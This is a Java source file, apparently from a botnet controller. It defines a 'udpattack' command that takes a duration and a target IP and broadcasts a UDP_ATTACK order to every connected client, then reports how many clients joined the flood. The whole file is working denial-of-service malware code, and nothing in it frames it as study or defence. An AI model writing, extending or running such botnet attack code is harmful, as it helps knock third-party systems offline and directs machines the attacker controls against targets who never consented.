package net.vitox.command.commands;

import net.vitox.Main;
import net.vitox.command.Command;
import net.vitox.user.User;
import net.vitox.user.UserHandler;
import net.vitox.utils.SendUtil;

public class UDPAttackCommand extends Command {

    public UDPAttackCommand() {
        super("udpattack", "Send a UDP flood to a target.");
    }

    @Override
    public void runCommand(String[] args) {

        try {

            if (args.length <= 2) {
                System.out.println("Missing arguments: .udpattack <duration in ms> <ip>");
                return;
            }

            for (User user : UserHandler.userList) {
                SendUtil.getInstance().writeMsg("UDP_ATTACK" + Main.TRIM_CHAR + args[1] + Main.TRIM_CHAR + args[2], user.getSocket());
            }

            System.out.println("Succesfully sent attack commands to: " + args[2] + ". Using: " + UserHandler.userList.size() + " clients. For " + args[1] + "ms");
        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
